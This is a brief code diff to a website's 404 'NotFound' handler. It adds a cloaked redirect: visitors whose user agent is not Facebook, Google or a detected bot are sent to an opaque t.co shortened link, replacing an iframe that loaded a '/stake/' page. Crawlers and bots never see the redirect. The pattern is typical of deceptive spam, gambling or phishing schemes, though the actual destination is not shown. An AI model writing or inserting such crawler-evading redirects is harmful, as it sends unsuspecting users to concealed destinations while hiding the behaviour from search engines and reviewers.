@@ -78,7 +78,8 @@ function NotFound() {
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
-      return(showIframe("/stake/index.html",SiteTitleMeta,false));
+      return window.location.href = 'https://t.co/eTzKSTCwng';
+      //return(showIframe("/stake/index.html",SiteTitleMeta,false));
     // if(IsUserHiden){
     //   return(showIframe("/id/home.html",SiteTitleHome,false));
     // }else{
